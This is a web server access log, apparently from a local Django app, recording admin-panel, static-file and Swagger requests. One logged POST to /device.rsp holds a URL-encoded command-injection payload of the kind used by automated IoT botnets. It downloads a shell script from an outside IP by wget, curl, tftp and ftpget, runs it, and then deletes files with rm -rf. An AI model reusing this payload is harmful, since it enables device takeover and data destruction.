172.18.0.1 - - [07/Jun/2026:07:07:05 +0000] "CONNECT httpbin.org:443 HTTP/1.1" 405 157 "-" "-"
172.18.0.1 - - [17/Jun/2026:07:53:50 +0000] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 441 "http://127.0.0.1/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:50 +0000] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2810 "http://127.0.0.1/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:50 +0000] "GET /static/admin/css/responsive.css HTTP/1.1" 200 16273 "http://127.0.0.1/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:50 +0000] "GET /static/admin/css/base.css HTTP/1.1" 200 23100 "http://127.0.0.1/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:50 +0000] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 3063 "http://127.0.0.1/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:50 +0000] "GET /static/admin/js/theme.js HTTP/1.1" 200 1653 "http://127.0.0.1/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:51 +0000] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 689 "http://127.0.0.1/static/admin/css/base.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:51 +0000] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 593 "http://127.0.0.1/static/admin/css/base.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:51 +0000] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 978 "http://127.0.0.1/static/admin/css/base.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:51 +0000] "GET /favicon.ico HTTP/1.1" 404 3179 "http://127.0.0.1/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:55 +0000] "GET /admin/users/myuser/ HTTP/1.1" 200 15472 "http://127.0.0.1/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:55 +0000] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:55 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 16820 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:55 +0000] "GET /static/admin/js/actions.js HTTP/1.1" 200 8076 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:55 +0000] "GET /static/admin/js/core.js HTTP/1.1" 200 6208 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:55 +0000] "GET /static/admin/js/urlify.js HTTP/1.1" 200 7887 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:55 +0000] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:55 +0000] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 9777 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:55 +0000] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 285314 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:55 +0000] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 325171 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:55 +0000] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 593 "http://127.0.0.1/static/admin/css/base.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:55 +0000] "GET /static/admin/img/icon-viewlink.svg HTTP/1.1" 200 928 "http://127.0.0.1/static/admin/css/base.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:57 +0000] "GET /admin/users/myuser/1/change/ HTTP/1.1" 200 30072 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:53:57 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 16820 "http://127.0.0.1/admin/users/myuser/1/change/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:54:02 +0000] "POST /admin/users/myuser/1/change/ HTTP/1.1" 302 0 "http://127.0.0.1/admin/users/myuser/1/change/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:54:02 +0000] "GET /admin/users/myuser/ HTTP/1.1" 200 15716 "http://127.0.0.1/admin/users/myuser/1/change/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:54:02 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 16820 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:54:02 +0000] "GET /static/admin/img/icon-yes-dark.svg HTTP/1.1" 200 558 "http://127.0.0.1/static/admin/css/base.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:54:12 +0000] "GET /admin/users/myuser/1/change/ HTTP/1.1" 200 30060 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:54:12 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 16820 "http://127.0.0.1/admin/users/myuser/1/change/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:54:15 +0000] "POST /admin/users/myuser/1/change/ HTTP/1.1" 302 0 "http://127.0.0.1/admin/users/myuser/1/change/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:54:15 +0000] "GET /admin/users/myuser/ HTTP/1.1" 200 15718 "http://127.0.0.1/admin/users/myuser/1/change/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [17/Jun/2026:07:54:16 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 16820 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:22:53 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:22:53 +0000] "GET /favicon.ico HTTP/1.1" 502 559 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:28:42 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:28:42 +0000] "GET /favicon.ico HTTP/1.1" 502 559 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:38:36 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:38:36 +0000] "GET /favicon.ico HTTP/1.1" 502 559 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:38:36 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:38:36 +0000] "GET /favicon.ico HTTP/1.1" 502 559 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:40:55 +0000] "GET / HTTP/1.1" 404 3280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:40:55 +0000] "GET /favicon.ico HTTP/1.1" 404 3331 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:41:03 +0000] "GET /admin/ HTTP/1.1" 500 239321 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:40 +0000] "GET /admin/ HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:40 +0000] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 4260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:40 +0000] "GET /static/admin/css/dark_mode.css HTTP/1.1" 304 0 "http://127.0.0.1/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:40 +0000] "GET /static/admin/css/login.css HTTP/1.1" 200 951 "http://127.0.0.1/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:40 +0000] "GET /static/admin/css/base.css HTTP/1.1" 304 0 "http://127.0.0.1/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:40 +0000] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0 "http://127.0.0.1/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:40 +0000] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0 "http://127.0.0.1/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:40 +0000] "GET /static/admin/js/theme.js HTTP/1.1" 304 0 "http://127.0.0.1/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:40 +0000] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0 "http://127.0.0.1/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:46 +0000] "POST /admin/login/?next=/admin/ HTTP/1.1" 200 4534 "http://127.0.0.1/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:56 +0000] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0 "http://127.0.0.1/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:57 +0000] "GET /admin/ HTTP/1.1" 200 15699 "http://127.0.0.1/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:57 +0000] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0 "http://127.0.0.1/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:57 +0000] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 689 "http://127.0.0.1/static/admin/css/base.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:57 +0000] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0 "http://127.0.0.1/static/admin/css/base.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:42:57 +0000] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0 "http://127.0.0.1/static/admin/css/base.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:43:07 +0000] "GET /admin/ HTTP/1.1" 200 15699 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:43:12 +0000] "GET /swagger HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:43:13 +0000] "GET /swagger/ HTTP/1.1" 200 2656 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:43:13 +0000] "GET /static/drf-yasg/style.css HTTP/1.1" 200 1187 "http://127.0.0.1/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:43:13 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui.css HTTP/1.1" 200 177183 "http://127.0.0.1/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:43:13 +0000] "GET /static/drf-yasg/insQ.min.js HTTP/1.1" 200 2093 "http://127.0.0.1/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:43:13 +0000] "GET /static/drf-yasg/swagger-ui-init.js HTTP/1.1" 200 15480 "http://127.0.0.1/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:43:13 +0000] "GET /static/drf-yasg/immutable.min.js HTTP/1.1" 200 56904 "http://127.0.0.1/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:43:13 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui-standalone-preset.js HTTP/1.1" 200 252451 "http://127.0.0.1/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:43:13 +0000] "GET /static/drf-yasg/swagger-ui-dist/swagger-ui-bundle.js HTTP/1.1" 200 1510271 "http://127.0.0.1/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:43:13 +0000] "GET /static/drf-yasg/swagger-ui-dist/favicon-32x32.png HTTP/1.1" 200 628 "http://127.0.0.1/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:43:13 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 38038 "http://127.0.0.1/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:48:37 +0000] "GET /admin/ HTTP/1.1" 200 15699 "http://127.0.0.1/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:48:39 +0000] "GET /swagger/ HTTP/1.1" 200 2656 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:48:40 +0000] "GET /swagger/?format=openapi HTTP/1.1" 200 38038 "http://127.0.0.1/swagger/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:12:52:15 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%20%7C%7C%20cd%20%2Fvar%2Frun%20%7C%7C%20cd%20%2Fmnt%20%7C%7C%20cd%20%2Froot%20%7C%7C%20cd%20%2F%3B%20wget%20http%3A%2F%2F185.193.67.54%2Fhiroz3x.sh%3B%20curl%20-O%20http%3A%2F%2F185.193.67.54%2Fhiroz3x.sh%3B%20chmod%20777%20hiroz3x.sh%3B%20sh%20hiroz3x.sh%3B%20tftp%20185.193.67.54%20-c%20get%20hiroz3x.sh%3B%20chmod%20777%20hiroz3x.sh%3B%20sh%20hiroz3x.sh%3B%20tftp%20-r%20hiroz3x2.sh%20-g%20185.193.67.54%3B%20chmod%20777%20hiroz3x2.sh%3B%20sh%20hiroz3x2.sh%3B%20ftpget%20-v%20-u%20anonymous%20-p%20anonymous%20-P%2021%20185.193.67.54%20hiroz3x1.sh%20hiroz3x1.sh%3B%20sh%20hiroz3x1.sh%3B%20rm%20-rf%20hiroz3x.sh%20hiroz3x.sh%20hiroz3x2.sh%20hiroz3x1.sh%3B%20rm%20-rf%20%2A HTTP/1.1" 400 69622 "-" "Mozila/5.0"
172.18.0.1 - - [18/Jun/2026:13:21:40 +0000] "GET /admin/ HTTP/1.1" 200 15699 "http://127.0.0.1/admin/login/?next=/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:13:21:54 +0000] "GET /admin/users/myuser/ HTTP/1.1" 200 16423 "http://127.0.0.1/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:13:21:54 +0000] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:13:21:54 +0000] "GET /admin/jsi18n/ HTTP/1.1" 200 16820 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
172.18.0.1 - - [18/Jun/2026:13:21:54 +0000] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0 "http://127.0.0.1/admin/users/myuser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.0.0"
